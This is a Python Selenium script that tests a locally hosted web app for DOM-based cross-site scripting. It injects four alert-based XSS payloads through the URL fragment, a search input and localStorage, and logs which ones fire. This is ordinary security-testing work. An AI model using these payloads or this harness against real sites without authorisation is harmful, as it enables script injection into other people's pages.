from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
import time
import csv
import json
import os

# Setup
geckodriver_path = "/usr/local/bin/geckodriver"
profile_path = "/home/gencipher/.mozilla/firefox/maquu2av.selenium_xss"  # Updated profile

options = Options()
# Headless mode is OFF for visible alert testing
# options.headless = True  # Leave commented

profile = webdriver.FirefoxProfile(profile_path)
service = Service(executable_path=geckodriver_path)

browser = webdriver.Firefox(service=service, options=options, firefox_profile=profile)

target_url = "http://localhost:3000"

payloads = [
    '"><script>alert("XSS1")</script>',
    '\'><img src=x onerror=alert("XSS2")>',
    '"><svg onload=alert("SVG")>',
    '"><iframe src=javascript:alert("XSS3")>'
]

results = []

def check_for_alert():
    try:
        alert = browser.switch_to.alert
        print(f"  [!] Alert text: {alert.text}")
        alert.accept()
        return True
    except:
        return False

def test_payload_in_url(payload):
    try:
        url = f'{target_url}/#search={payload}'
        browser.get(url)
        time.sleep(2)
        alert_present = check_for_alert()
        print(f'[{"✓" if alert_present else "✗"}] Payload in URL: {payload}')
        results.append({'location': 'url', 'payload': payload, 'success': alert_present})
    except Exception as e:
        print(f'[ERROR] URL test failed for payload: {payload}\n{e}')
        results.append({'location': 'url', 'payload': payload, 'success': False})

def test_payload_in_input(payload):
    try:
        browser.get(target_url)
        time.sleep(2)
        js = f"document.getElementById('searchQuery').value = '{payload}';"
        browser.execute_script(js)
        time.sleep(2)
        alert_present = check_for_alert()
        print(f'[{"✓" if alert_present else "✗"}] Payload in input: {payload}')
        results.append({'location': 'input', 'payload': payload, 'success': alert_present})
    except Exception as e:
        print(f'[ERROR] Input test failed for payload: {payload}\n{e}')
        results.append({'location': 'input', 'payload': payload, 'success': False})

def test_payload_in_localstorage(payload):
    try:
        browser.get(target_url)
        time.sleep(2)
        browser.execute_script(f"localStorage.setItem('testXSS', '{payload}');")
        browser.refresh()
        time.sleep(2)
        alert_present = check_for_alert()
        print(f'[{"✓" if alert_present else "✗"}] Payload in localStorage: {payload}')
        results.append({'location': 'localstorage', 'payload': payload, 'success': alert_present})
    except Exception as e:
        print(f'[ERROR] localStorage test failed for payload: {payload}\n{e}')
        results.append({'location': 'localstorage', 'payload': payload, 'success': False})

print("[+] Starting DOM XSS tests...\n")

for payload in payloads:
    print(f"[*] Testing payload: {payload}")
    test_payload_in_url(payload)
    test_payload_in_input(payload)
    test_payload_in_localstorage(payload)
    print("")

browser.quit()

with open('dom_xss_results.csv', 'w', newline='', encoding='utf-8') as csvfile:
    writer = csv.DictWriter(csvfile, fieldnames=['location', 'payload', 'success'])
    writer.writeheader()
    writer.writerows(results)

with open('dom_xss_results.json', 'w', encoding='utf-8') as jsonfile:
    json.dump(results, jsonfile, indent=4)

print("[✓] All tests done. Results saved to 'dom_xss_results.csv' and 'dom_xss_results.json'.")

